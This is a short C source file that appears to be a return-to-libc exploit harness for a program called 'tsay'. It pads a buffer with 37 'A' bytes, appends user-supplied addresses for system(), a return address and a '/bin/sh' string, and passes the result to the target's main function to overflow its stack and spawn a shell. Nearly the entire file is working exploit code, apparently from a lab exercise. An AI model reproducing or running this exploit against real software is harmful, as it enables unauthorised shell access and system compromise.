#include <stdlib.h>
int real_main(int argc, char *argv[]);

const int spacelen=37;
const char shellarg[] =  "/bin/sh";
const unsigned long int dummy = 0xbeeebeee;

int main(int argc, char *argv[]){

	if(argc!=4){
	printf("Usage: tsay <System function address> <return address> <system command address>\n Check those address with gdb");
	return(-1);
	}

	int argcc = 2;
	char pad[spacelen];
	memset(pad,'A',spacelen);
	unsigned char commandadd[4];
	unsigned char retadd[4];
	unsigned char systemadd[4];

	sscanf(argv[1],"%lx",systemadd);
	sscanf(argv[2],"%lx",retadd);
	sscanf(argv[3],"%lx",commandadd);

	printf("system() address:");
	int i;
	for(i=3;i>=0;i--) printf("%02x",systemadd[i]);
	printf("command address:");
	for(i=3;i>=0;i--) printf("%02x",commandadd[i]);

	char tainedbuf[spacelen+12];

	//memset(tainedbuf,'A',spacelen);
	strcpy(tainedbuf,pad);
	for(i=0;i<4;i++) tainedbuf[spacelen+i]=systemadd[i];
	for(i=0;i<4;i++) tainedbuf[spacelen+i+4]=retadd[i];
	for(i=0;i<4;i++) tainedbuf[spacelen+i+8]=commandadd[i];

	printf(tainedbuf);
	
	char *argvv[]={"tsay",tainedbuf};

	return(real_main(argcc, argvv));
}


